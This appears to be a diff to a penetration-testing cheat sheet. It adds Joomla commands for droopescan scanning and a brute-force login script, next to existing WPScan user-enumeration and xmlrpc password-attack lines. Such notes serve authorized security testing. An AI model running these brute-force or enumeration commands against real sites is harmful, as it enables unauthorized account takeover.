@@ -1030,6 +1030,13 @@ $ sudo wpscan --url <URL> -e u,ap,at,cb,dbe
 $ sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url <URL>
 ```
 
+- Joomla
+
+```
+$ droopescan scan joomla --url <URL>
+$ sudo python3 joomla-brute.py -u <URL> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr users.txt
+```
+
 - PRTG Network Monitor
 
 ```
